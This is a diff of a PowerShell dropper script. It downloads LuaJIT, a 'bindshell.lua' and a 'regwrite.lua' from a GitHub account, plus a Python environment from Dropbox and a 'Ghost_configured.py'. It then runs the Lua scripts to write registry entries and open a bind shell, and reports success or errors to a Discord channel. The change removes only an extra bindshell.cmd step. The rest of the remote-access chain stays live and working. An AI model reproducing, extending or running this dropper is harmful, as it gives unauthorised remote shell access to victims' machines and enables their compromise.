@@ -6,12 +6,10 @@ $luaJitZip = "$baseDir\LuaJIT-2.1.zip"
 $luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
 $bindshellScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.lua"
 $regwriteScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/regwrite.lua"
-$bindshellCmdUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.cmd"
 $pythonEnvZipUrl = "https://www.dropbox.com/scl/fi/6ghhk00dw3zalvia56prb/env.zip?rlkey=n5qj3jwp18jj0jiw31r7vtcrd&st=80f4xypt&dl=1"
 $ghostConfigPyUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/Ghost_configured.py"
 $bindshellScriptPath = "$baseDir\bindshell.lua"
 $regwriteScriptPath = "$baseDir\regwrite.lua"
-$bindshellCmdPath = "$baseDir\bindshell.cmd"
 $pythonEnvZipPath = "$baseDir\python-env.zip"
 $ghostConfigPyPath = "$baseDir\Ghost_configured.py"
 $pythonEnvPath = "$baseDir\env"
@@ -257,7 +255,6 @@ Wait-ForMinute
 $scriptUrls = @{
     "bindshell.lua" = $bindshellScriptUrl
     "regwrite.lua" = $regwriteScriptUrl
-    "bindshell.cmd" = $bindshellCmdUrl
 }
 
 foreach ($script in $scriptUrls.Keys) {
@@ -276,11 +273,10 @@ foreach ($script in $scriptUrls.Keys) {
 try {
     Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$regwriteScriptPath" -NoNewWindow -Wait
     Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$bindshellScriptPath" -NoNewWindow -Wait
-    Start-Process -FilePath "$bindshellCmdPath" -NoNewWindow -Wait
-    $message = "Lua scripts and cmd file executed successfully."
+    $message = "Lua scripts file executed successfully."
     Send-DiscordMessage -message $message
 } catch {
-    $message = "Error executing scripts and cmd file: $(${_})"
+    $message = "Error executing scripts file: $(${_})"
     Send-DiscordMessage -message $message
     Wait-ForMinute
     pause
